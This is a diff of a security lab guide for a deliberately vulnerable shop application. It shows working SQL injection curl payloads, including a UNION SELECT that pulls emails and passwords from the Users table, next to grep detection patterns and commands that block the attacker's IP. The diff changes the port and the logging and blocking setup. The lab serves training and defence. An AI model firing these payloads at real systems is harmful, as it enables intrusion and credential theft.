@@ -23,10 +23,10 @@ admin'--
 #### Search SQL Injection
 ```bash
 # Basic UNION injection
-curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
+curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
 
 # Extract users table
-curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
+curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
 ```
 
 #### Extracted Data
@@ -46,12 +46,12 @@ curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+id,email,passw
 
 #### Find SQL Injection Attempts
 ```bash
-grep -iE "(union|select|or.1=1|'--|%27)" ./logs/nginx/access.log
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1|'--|%27)"
 ```
 
 #### Count Attacks Per IP
 ```bash
-grep -iE "(union|select|or.1=1)" ./logs/nginx/access.log | \
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1)" | \
     awk '{print $1}' | sort | uniq -c | sort -rn
 ```
 
@@ -64,14 +64,12 @@ message: (*UNION* OR *SELECT* OR *OR*1=1* OR *'--*)
 
 ```bash
 # Find attacker IP
-ATTACKER=$(grep -iE "union|select" ./logs/nginx/access.log | \
+ATTACKER=$(docker logs nginx-proxy 2>&1 | grep -iE "union|select" | \
     awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
 
-# Block with iptables
-sudo iptables -A INPUT -s $ATTACKER -j DROP
-
-# Verify block
-sudo iptables -L -n | grep $ATTACKER
+# Block inside nginx container
+docker exec nginx-proxy sh -c "echo 'deny $ATTACKER;' >> /etc/nginx/blocked.conf"
+docker exec nginx-proxy nginx -s reload
 ```
 
 ### Sample Incident Report
